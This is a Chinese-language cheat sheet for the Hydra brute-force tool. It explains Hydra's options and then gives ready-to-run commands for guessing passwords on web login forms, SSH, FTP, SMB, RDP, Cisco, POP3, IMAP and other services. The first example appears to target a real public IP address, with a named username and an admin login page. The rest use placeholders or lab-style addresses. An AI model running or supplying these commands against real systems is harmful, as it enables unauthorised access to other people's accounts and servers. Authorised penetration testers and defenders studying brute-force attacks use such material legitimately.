## hydra九头蛇：暴力破解工具
hydra是一个支持众多协议的爆破工具。<br>

**参数详解**<br>
参数 | 用途
---- | -----
-l | 指定单个用户名，适合在知道用户名爆破用户名密码时使用
-L | 指定多个用户名，参数值为存储用户名的文件的路径(建议为绝对路径)
-p | 指定单个密码，适合在知道密码爆破用户名时使用
-P | 指定多个密码，参数值为存贮密码的文件(通常称为字典)的路径(建议为绝对路径)
-C | 当用户名和密码存储到一个文件时使用此参数。注意，文件(字典)存储的格式必须为 "用户名:密码" 的格式。
-M | 指定多个攻击目标，此参数为存储攻击目标的文件的路径(建议为绝对路径)。注意：列表文件存储格式必须为 "地址:端口"
-t | 指定爆破时的任务数量(可以理解为线程数)，默认为16
-s | 指定端口，适用于攻击目标端口非默认的情况。例如：http服务使用非80端口
-S | 指定爆破时使用 SSL 链接
-R | 继续从上一次爆破进度上继续爆破
-v/-V | 显示爆破的详细信息
-f | 一但爆破成功一个就停止爆破
server | 代表要攻击的目标(单个)，多个目标时请使用 -M 参数
service | 攻击目标的服务类型(可以理解为爆破时使用的协议)，例如 http ，在hydra中，不同协议会使用不同的模块来爆破，hydra 的 http-get 和 http-post 模块就用来爆破基于 get 和 post 请求的页面
OPT | 爆破模块的额外参数，可以使用 -U 参数来查看模块支持那些参数，例如命令：hydra -U http-get

### 1、破解http post:
```shell
hydra -t 10 -l vaccigen -P /opt/fuzzDicts-master/passwordDict/top6000.txt -o out.txt -f -vV 52.196.234.51 http-post-form "/admin/index.php:account=^USER^&password=^PASS^:error" 
```
### 2、破解http get:
```shell
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/ 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
```
### 3、破解https:
```shell
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https 
```
### 4、破解ssh:
```shell
hydra 192.168.56.12 ssh -l user -P /root/Work/sshpasswd.list -t 6 -V -f
```
### 5、破解ftp:
```shell
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 
```
### 6、破解teamspeak： 
```shell
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak 
```
### 7、破解cisco： 
```shell
hydra -P pass.txt 10.36.16.18 cisco 
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable 
```
### 8、破解smb： 
```shell
hydra -l administrator -P pass.txt 10.36.16.18 smb 
```
### 9、破解pop3： 
```shell
hydra -l muts -P pass.txt my.pop3.mail pop3 
```
### 10、破解rdp： 
```shell
hydra ip rdp -l administrator -P pass.txt -V 
```
### 11、破解http-proxy： 
```shell
hydra -l admin -P pass.txt http-proxy://10.36.16.18 
```
### 12、破解imap: 
```shell
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN 
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```
